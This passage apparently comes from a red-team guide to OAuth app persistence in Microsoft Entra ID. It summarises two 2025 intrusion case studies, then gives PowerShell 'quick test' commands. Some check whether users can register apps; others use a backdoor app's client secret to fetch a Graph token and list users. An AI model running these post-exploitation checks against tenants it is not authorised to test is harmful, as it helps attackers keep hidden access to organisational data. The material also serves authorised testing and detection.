### Example 2: VOLEXITY Trusted Microsoft App Abuse (2025)

- **Target:** Government and critical infrastructure organizations
- **Timeline:** March 2025 – July 2025
- **Technique Status:** Attackers used legitimate Microsoft first-party applications (VS Code, Teams) to bypass Conditional Access
- **Attack Flow:**
  1. Compromised user account via phishing
  2. Attacker generated custom OAuth tokens using ROADtools
  3. Used legitimate Microsoft app IDs (Teams, VS Code) to authenticate
  4. Conditional Access policies didn't trigger (tokens appeared legitimate)
  5. Accessed mailboxes, SharePoint, downloaded classified documents
- **Impact:** Months of undetected data exfiltration
- **Reference:** [Elastic Security Labs: Entra ID OAuth Phishing Detection](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)

### Example 3: Weaver Ant Persistence via SaaS Integrations (2025)

- **Target:** Multinational enterprise with hybrid AD/Azure setup
- **Timeline:** Discovered March 2025 (operating for 3+ years undetected)
- **Technique Status:** Created minimalist OAuth apps registered as "integration helpers"
- **Impact:**
  - Apps used to access Exchange Online (proxy for C2)
  - Lateral movement to on-premises via Azure AD Connect
  - Persistence maintained via multiple OAuth apps (removal of one didn't affect others)
- **Reference:** [Sygnia: Weaver Ant Cyber Espionage Campaign](https://www.sygnia.co/threat-reports-and-advisories/weaver-ant-tracking-a-china-nexus-cyber-espionage-operation/)

---

## APPENDIX: Quick Test Commands

**Verify Technique Viability:**
```powershell
# Check if user can register apps
Get-MgContext
Get-MgPoliciesAuthorizationPolicy | Select-Object DefaultUserRolePermissions

# List existing apps
Get-MgApplication -Top 5 | Select-Object DisplayName, AppId, CreatedDateTime
```

**Post-Exploitation Verification:**
```powershell
# Verify backdoor app can access data
$tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
$body = @{
    grant_type = "client_credentials"
    client_id = $appId
    client_secret = $secret
    scope = "https://graph.microsoft.com/.default"
}

$token = (Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body).access_token

# Try to access users (if successful, persistence achieved)
$headers = @{ Authorization = "Bearer $token" }
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users?`$top=5" -Headers $headers
```

---